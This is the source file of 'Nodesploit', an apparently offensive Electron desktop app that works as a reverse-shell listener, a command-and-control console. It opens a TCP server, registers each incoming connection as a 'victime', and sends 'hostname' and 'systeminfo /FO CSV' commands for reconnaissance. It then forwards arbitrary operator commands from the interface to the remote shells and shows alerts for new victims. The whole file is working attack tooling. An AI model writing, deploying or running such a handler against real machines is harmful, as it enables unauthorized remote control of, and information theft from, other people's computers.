'use strict'

import { app, protocol, BrowserWindow, ipcMain, Notification } from 'electron'
import store from '@/store'
import { nanoid } from 'nanoid'
import {
  createProtocol,
  installVueDevtools
} from 'vue-cli-plugin-electron-builder/lib'
const isDevelopment = process.env.NODE_ENV !== 'production'

// Scheme must be registered before the app is ready
protocol.registerSchemesAsPrivileged([
  { scheme: 'app', privileges: { secure: true, standard: true } }
])

// Creation of BrowserWindow
function createWindow () {
  // Create the browser window.
  var win = new BrowserWindow({
    height: 563,
    width: 1000,
    show: false,
    frame: true,
    movable: true,
    useContentSize: true,
    webPreferences: {
      nodeIntegration: true
    }
  })

  if (process.env.WEBPACK_DEV_SERVER_URL) {
    // Load the url of the dev server if in development mode
    win.loadURL(process.env.WEBPACK_DEV_SERVER_URL)
    if (!process.env.IS_TEST) win.webContents.openDevTools()
  } else {
    createProtocol('app')
    // Load the index.html when not in development
    win.loadURL('app://./index.html')
  }

  return win
}

// Exit cleanly on request from parent process in development mode.
if (isDevelopment) {
  if (process.platform === 'win32') {
    process.on('message', (data) => {
      if (data === 'graceful-exit') {
        app.quit()
      }
    })
  } else {
    process.on('SIGTERM', () => {
      app.quit()
    })
  }
}

class Nodesploit {
  /**
   * @constructor
   */
  constructor () {
    this.mainWin = null
    this.loadWin = null
    this.server = null
    this.sockets = new Map()
  }

  /**
   * Function to initalise life cycle of application.
   */
  init () {
    // This method will be called when Electron has finished
    // initialization and is ready to create browser windows.
    // Some APIs can only be used after this event occurs.
    app.on('ready', async () => {
      if (isDevelopment && !process.env.IS_TEST) {
        // Install Vue Devtools
        try {
          await installVueDevtools()
        } catch (e) {
          console.error('Vue Devtools failed to install:', e.toString())
        }
      }

      // this.loadWin = loadingWindow()
      this.mainWin = createWindow()
      this.mainWin.webContents.on('did-finish-load', () => {
        this.mainWin.show()
        // this.loadWin.destroy()
      })

      this.mainWin.on('closed', () => {
        this.mainWin = null
      })
    })

    // Quit when all windows are closed.
    app.on('window-all-closed', () => {
      // On macOS it is common for applications and their menu bar
      // to stay active until the user quits explicitly with Cmd + Q
      if (process.platform !== 'darwin') {
        app.quit()
      }
    })

    app.on('activate', () => {
      // On macOS it's common to re-create a window in the app when the
      // dock icon is clicked and there are no other windows open.
      if (this.mainWin === null) {
        this.mainWin = createWindow()
      }
    })
  }

  /**
   * Function to create and listening on server.
   * @param  {Object} connection
   * @return {Boolean} Listening OR Not listening
   */
  createServer (connection) {
    var net = require('net')
    this.server = new net.Server()

    process.on('SIGTERM', () => {
      this.server.close()
    })

    /**
     * This events is called when server is successfully listened, See {this.server.listen()} for more detaille
     */
    this.server.on('listening', () => {
      if (store.getters.notification) {
        var notif = new Notification({
          title: 'Server is ON',
          body: `Le serveur ecoute sur le port ${
            this.server.address().port
          } et l'adresse ${this.server.address().address}`
        })

        notif.show()
      }
    })

    /**
     * This event is called when server is successfully closed
     */
    this.server.on('close', () => {
      if (store.getters.notification) {
        var notif = new Notification({
          title: 'Server closed',
          body: "Le serveur n'ecoute plus sur le port"
        })
        notif.show()
      }
    })

    /**
     * @param  {Error} e
     * This events is called when error occur in server
     */
    this.server.on('error', (e) => {
      if (e.code === 'EADDRINUSE') {
        console.log('Address in use, retrying...')
      }
    })

    /**
     * This events is called when a new victime is connected to server
     */
    this.server.on('connection', (socket) => {
      var alreadyExist = false
      this.sockets.forEach((soc) => {
        if (soc.remoteAddress === socket.remoteAddress) {
          alreadyExist = true
        }
      })
      if (alreadyExist) {
        socket.end()
      } else {
        socket.setKeepAlive(true, Infinity)
        socket.setDefaultEncoding('utf8')
        socket.id = nanoid(10)

        this.addVictime(socket)

        socket.on('error', (e) => {
          console.log(e)
          if (e.code === 'ECONNRESET') {
            console.log('Socket end shell with CTRL+C')
            console.log('DEL[ERROR]: ' + socket.id)
          }
        })

        socket.on('close', () => {
          console.log('DEL[CLOSE]: ' + socket.id)
          this.deleteVictime(socket.id)
        })

        socket.on('end', () => {
          console.log('DEL[END]: ' + socket.id)
          this.deleteVictime(socket.id)
        })

        socket.on('timeout', () => {
          console.log('timeoiut .')
        })

        var cmd = ''
        ipcMain.on('cmd', (event, res) => {
          if (socket.id === res.id) {
            cmd = res.msg.trim() + '\n'
            var child = this.sockets.get(res.id)
            child.write(cmd)
          }
        })

        var hostname = false
        var systeminfo = false
        socket.on('data', (data) => {
          if (hostname) {
            console.log(
              'HOSTNAME: ' +
                data
                  .toString()
                  .trim()
                  .split('\n')[0]
            )
            var victime = this.sockets.get(socket.id)
            victime.hostname = data.toString().trim()
            this.sockets.set(socket.id, victime)
            this.addInformation({
              id: socket.id,
              property: { name: 'hostname', data: data.toString().trim() }
            })
            hostname = false
          } else if (systeminfo) {
            this.mainWin.webContents.send('systeminfo', data.toString())
            systeminfo = false
          }
          data.toString().includes('hostname') ? (hostname = true) : (hostname = false)
          data.toString().includes('systeminfo /FO CSV') ? (systeminfo = true) : (systeminfo = false)
          this.mainWin.webContents.send('datarec', {
            data: data.toString('utf8'),
            id: socket.id
          })
        })
      }
    })

    /**
     * @param  {String} host
     * @param  {Number} port
     * This events is called to etablish listening in server with IP & Port
     */
    this.server.listen({ host: connection.ip, port: connection.port }, () => {
      console.log(`🔥 Server listen in ${connection.port}`)
    })

    return this.server.listening
  }

  /**
   * Function to close current open server.
   * @return {Boolean}
   */
  closeServer () {
    if (this.server.close()) {
      return true
    }
  }

  /**
   * Function to delete or close connection of 'x' victime.
   * @param {String} id
   */
  deleteVictime (id) {
    store.dispatch('REMOVE_CHILD', id)
    if (this.sockets.has(id)) {
      this.sockets.get(id).destroy()
      this.sockets.delete(id)
    }
  }

  addInformation (victime) {
    store.dispatch('ADD_INFORMATION', victime)
  }

  /**
   * Function to add socket in Sockets Map()
   * @param  {Socket} socket
   */
  addVictime (socket) {
    this.sockets.set(socket.id, socket)
    const victime = this.sockets.get(socket.id)
    victime.write('hostname' + '\n')
    store.dispatch('ADD_CHILD', {
      id: victime.id,
      ip: victime.remoteAddress,
      hostname: victime.hostname
    })
    console.log(`[💀] New Victime: ${victime.id}`)

    if (store.getters.notification) {
      var notif = new Notification({
        title: 'Nouvelles connexion !',
        body: `une nouvelles connexion entrant ${victime.remoteAddress}`
      })
      notif.show()
    }
  }
}

var ns = new Nodesploit()

ns.init()

ipcMain.on('close-app', () => {
  app.quit()
})

ipcMain.on('maximize-app', () => {
  if (ns.mainWin.isFullScreen()) {
    ns.mainWin.setFullScreen(false)
  } else {
    ns.mainWin.setFullScreen(true)
  }
})

ipcMain.on('minimize-app', () => {
  ns.mainWin.minimize()
})

ipcMain.handle('serverlisten', (event, connection) => {
  ns.createServer(connection)
})

ipcMain.handle('server-stoplisten', () => {
  ns.closeServer()
})

ipcMain.on('delete_victime', (event, id) => {
  ns.deleteVictime(id)
})

ipcMain.on('getInformation', (event, id) => {
  ns.sockets.get(id).write('systeminfo /FO CSV' + '\n')
})
